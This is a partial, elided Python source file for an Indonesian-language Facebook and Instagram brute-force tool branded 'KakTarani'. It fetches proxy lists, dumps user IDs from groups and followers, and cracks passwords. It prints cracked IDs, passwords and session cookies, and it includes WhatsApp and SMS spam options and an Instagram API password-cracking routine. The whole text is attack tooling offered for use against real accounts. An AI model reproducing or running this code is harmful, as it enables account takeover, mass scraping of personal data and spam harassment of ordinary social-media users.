...
from concurrent.futures import ThreadPoolExecutor as KakTarani 
...
sys.stdout.write('\x1b]2; BMBF | KakTarani Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari KakTarani');exit()
...
def menu(my_name,my_id):
	...
	_____KakTarani___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____KakTarani___xd____ in ['1','01']:
		brayen_dump()
	elif _____KakTarani___xd____ in ['2','02']:
		dump_massal()
	elif _____KakTarani___xd____ in ['3','03']:
		crack_group()
	elif _____KakTarani___xd____ in ['4','04']:
		crack_email()
	elif _____KakTarani___xd____ in ['5','05']:
		crack_file()
	elif _____KakTarani___xd____ in ['6','06']:
		crack_nama()
	elif _____KakTarani___xd____ in ['7','07']:
		pengikut()
	elif _____KakTarani___xd____ in ['8','08']:
		komen()
	elif _____KakTarani___xd____ in ['9','09']:
		file_cp()
	elif _____KakTarani___xd____ in ['10']:
		result()
	elif _____KakTarani___xd____ in ['11']:
		siu()
	elif _____KakTarani___xd____ in ['12']:
		spam_wa()
	elif _____KakTarani___xd____ in ['13']:
		spam_sms()
	elif _____KakTarani___xd____ in ['14']:
		dumpid()
	elif _____KakTarani___xd____ in ['instagram','Instagram']:
		loginCookie()
	elif _____KakTarani___xd____ in ['15']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='KakTarani-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='KakTarani-OK')
					cetak(statusok1)
...
class instagram:
	...
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":KakTarani()})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
				...
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":KakTarani()})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
...
#------------------[ METODE API V1 ]-------------------#
	def crackAPI(self,user,pas):
		...
		try:
			for pw in pas:
				KakTaranixd=random.randint(1000000000, 99999999999)
				...
				KakTaranixd=json.loads(respon.text)
				if 'userId' in str(KakTaranixd):
				...
				elif 'href="https://www.instagram.com/challenge/action/' in str(KakTaranixd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
